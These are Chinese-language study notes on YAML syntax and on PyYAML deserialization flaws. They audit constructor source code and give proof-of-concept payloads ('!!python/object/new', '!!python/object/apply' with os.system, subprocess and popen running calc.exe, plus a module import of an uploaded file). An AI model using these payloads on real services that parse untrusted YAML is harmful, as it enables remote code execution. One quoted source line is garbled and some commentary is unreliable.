## YAML 简介
YAML (YAML Ain't Markup Language, 即 YAML 不是一种标记语言) 是一种高可读的数据序列化的语言，可以被大多数编程语言支持使用，主要用于数据序列化、配置文件。

数据序列化，就是可以高效的表示或描述数据及数据关系的，以便用于存储和传输。

![[Pasted image 20240507110919.png]]


![[Pasted image 20240507111035.png]]

- 大小写敏感
- 使用缩进表示层级关系
- 缩进只允许使用空格
- #表示注释
- 支持对象、数组、纯量这3种数据结构
    - 对象：键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary）
    - 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）
    - 纯量（scalars）：单个的、不可再分的值

YAML 的配置文件后缀为 .yml，如：runoob.yml 。

### yaml 对象：
```yaml
key: 
    child-key: value
    child-key2: value2
```

### yaml 数组：
```yaml
companies:
    -
        id: 1
        name: company1
        price: 200W
    -
        id: 2
        name: company2
        price: 500W
        
```

### 复合结构：
```
languages:
  - Ruby
  - Perl
  - Python 
websites:
  YAML: yaml.org 
  Ruby: ruby-lang.org 
  Python: python.org 
  Perl: use.perl.org
```

### 引用：
```
defaults: &defaults
  adapter:  postgres
  host:     localhost

development:
  database: myapp_development
  <<: *defaults

test:
  database: myapp_test
  <<: *defaults

----------------------++--------------------------
defaults:
  adapter:  postgres
  host:     localhost

development:
  database: myapp_development
  adapter:  postgres
  host:     localhost

test:
  database: myapp_test
  adapter:  postgres
  host:     localhost
```

### 强制类型转换
上面还差一个重要的语法没讲：可以通过 `!!` 来进行类型转换。

通过上面的测试可以发现，如果识别到一个数字，那么按照 YAML 格式来处理，这个类型就是数字类型。如果我们想把数字类型变为字符串类型就可以这样：`a: !!str 1`，它的结果和 `a: "1"` 是一样的。

由于 YAML 仅仅是一种格式规范，所以理论上一个支持 YAML 的解析器可以选择性支持 YAML 的某些语法，也可以在 YAML 的基础上利用 `!!` 来扩展额外的解析能力。本文主要聚焦于 PyYAML，所以直接看源码就可以知道它在 `!!` 上做了哪些魔改。
![[Pasted image 20240507120333.png]]

这里**能够导入我们的 python**模块，也正是我们的**YAML**的危险的地方。

## PyYAML 详解
在 python 中，我们可以通过 `yaml_dump` 函数来把我们的对应的数据进行 YAML 格式化。
```
import yaml

data={'a':'1','b':2,'c':'abcdefg','e':[1,2,3]}

u=yaml.dump(data)

print(u)
```
![[Pasted image 20240507112704.png]]


我们可以通过 load 把对应的数据给**反序列化**
```
import yaml

data={'a':'1','b':2,'c':'abcdefg','e':[1,2,3]}

print(data)

u=yaml.dump(data)

print(u)

ppp=yaml.load(u,Loader=yaml.Loader)

print(ppp)
```

![[Pasted image 20240507113115.png]]

## 漏洞原因：
主要在 PyYaml<=5.1的版本下，默认**Constructor**为加载器，但是经过审计 yaml 模块中的 Constructor.py 的源码中存在对于 python 的标签解析时的漏洞。

在理解了基础的类型转换之后，查看源码可以发现还有一个 `add_multi_constructor` 函数，一共有 5 个：

- `python/name` (1)
- `python/module` (1)
- `python/object`
- `python/object/new` (1)
- `python/object/apply` (1)

我们重点审计上面的五个模块：
`python/module`
```python
def construct_python_module(self, suffix, node):
        value = self.construct_scalar(node)
        if value:
            raise ConstructorError("while constructing a Python module", node.start_mark,
                    "expected the empty value, but found %r" % value, node.start_mark)
        return self.find_python_module(suffix, node.start_mark)# 漏洞点
```

`python/object/apply`

```python
def construct_python_object_apply(self, suffix, node, newobj=False):
        if isinstance(node, SequenceNode):
            args = self.construct_sequence(node, deep=True)
            kwds = {}
            state = {}
            listitems = []
            dictitems = {}
        else:
            value = self.construct_mapping(node, deep=True)
            args = value.get('args', [])
            kwds = value.get('kwds', {})
            state = value.get('state', {})
            listitems = value.get('listitems', [])
            dictitems = value.get('dictitems', {})
        instance = self.make_python_instance(suffix, node, args, kwds, newobj) #漏洞点
        if state:
          self.set_python_instance_state(instance, state)
        if listitems:
            instance.extend(listitems)
        if dictitems:
            for key in dictitems:
                instance[key] = dictitems[key]
        return instance
```


`python/object/new`

```python
    def construct_python_object_new(self, suffix, node):
        return self.construct_python_object_apply(suffix, node, newobj=True)
```

`python/name`
```python
def construct_python_name(self, suffix, node):

        value = self.construct_scalar(node)

        if value:

            raise ConstructorError("while constructing a Python name", node.start_mark,

                    "expected the empty value, but found %r" % value, node.start_mark)

        return self.find_python_name(suffix, node.start_mark)#漏洞点
```

`python/object`

```python
def construct_python_object(self, suffix, node):

        # Format:

        #   !!python/object:module.name { ... state ... }

        instance = self.make_python_instance(suffix, node, newobj=True)# 漏洞点

        yield instance

        deep = hasattr(instance, '__setstate__')

        state = self.construct_mapping(node, deep=deep)
        self.set_python_instance_state(instance, state)
```

### 漏洞函数审计
```
def make_python_instance(self, suffix, node,
            args=None, kwds=None, newobj=False, unsafe=False): #用于创建Python对象的实例
        if not args:
            args = [] #对args进行空值处理，如果不存在，将args设置为空列表
        if not kwds:
            kwds = {} #对kwds进行空值处理，如果不存在，将kwds设置为空字典
        cls = self.find_python_name(suffix, node.start_mark)#利用定义的find_python_name方法根据suffix字符串和node节点的起始标记查找Python对象的完整名称，然后获取该对象的类对象
        if not (unsafe or i/sinstance(cls, type)):
            raise ConstructorError("while constructing a Python instance", node.start_mark,
                    "expected a class, but found %r" % type(cls),
                    node.start_mark)#如果unsafe参数为False，并且获取的对象不是类对象，则抛出ConstructorError异常。
        if newobj and isinstance(cls, type):
            return cls.__new__(cls, *args, **kwds)
        else:
            return cls(*args, **kwds)#根据newobj参数的值，以及获取的类对象是否为类型对象，选择使用__new__方法或__init__方法创建Python对象实例，并将args和kwds参数传递给构造函数。如果newobj为True且获取的类对象是类型对象，则使用__new__方法创建实例；否则，使用__init__方法创建实例
```

```
def find_python_name(self, name, mark, unsafe=False):
        if not name:
            raise ConstructorError("while constructing a Python object", mark,
                    "expected non-empty name appended to the tag", mark) #如果name为空，将会报错
        if '.' in name:
            module_name, object_name = name.rsplit('.', 1) #如果name中包含"."，将会对name进行分割为模板名和对象名
        else:
            module_name = 'builtins'
            object_name = name #如果name中没有"."，则会将模板名命名为"builtins"，对象名命名为"name"
        if unsafe:
            try:
                __import__(module_name) #unsafe默认为False，所以可以利用__import__将模块导入
            except ImportError as exc:
                raise ConstructorError("while constructing a Python object", mark,
                        "cannot find module %r (%s)" % (module_name, exc), mark) #如果ImportError异常，将会报错
        if not module_name in sys.modules:
            raise ConstructorError("while constructing a Python object", mark,
                    "module %r is not imported" % module_name, mark)#如果模块不在sys.modules字典中，将会报错
        module = sys.modules[module_name]
        if not hasattr(module, object_name):
            raise ConstructorError("while constructing a Python object", mark,
                    "cannot find %r in the module %r"
                    % (object_name, module.__name__), mark)#使用hasattr()函数查该模块是否包含了指定的对象名，如果没有将报错
        return getattr(module, object_name)#利用getattr()函数获取返回值,也就是hi行了对应的函数
```
通过审计 find_python_name()，我们发现还可以通过引用 module 的类创建对象，从而执行我们的恶意代码，实现攻击。

## 针对!!/object/new
```
import yaml

poc = '!!python/object/new:os.system ["calc.exe"]'
#给出一些相同用法的POC
#poc = '!!python/object/new:subprocess.check_output [["calc.exe"]]' 
#poc = '!!python/object/new:os.popen ["calc.exe"]'
#poc = '!!python/object/new:subprocess.run ["calc.exe"]'
#poc = '!!python/object/new:subprocess.call ["calc.exe"]'
#poc = '!!python/object/new:subprocess.Popen ["calc.exe"]'

yaml.load(poc)
```

## 针对 object/apply
```
import yaml

poc = '!!python/object/apply:os.system ["calc.exe"]'
#给出一些相同用法的POC
#poc = '!!python/object/apply:subprocess.check_output [["calc.exe"]]' 
#poc = '!!python/object/apply:os.popen ["calc.exe"]'
#poc = '!!python/object/apply:subprocess.run ["calc.exe"]'
#poc = '!!python/object/apply:subprocess.call ["calc.exe"]'
#poc = '!!python/object/apply:subprocess.Popen ["calc.exe"]'

yaml.load(poc)
```

### 针对 module
我们这个需要搭配我们的文件上传方法，我们先把我们的文件写入到我们的 `eval.py` 中，然后再去执行下面的语句：
```
#a.py
import yaml

yaml.load('!!python/module:uploads.eval')
```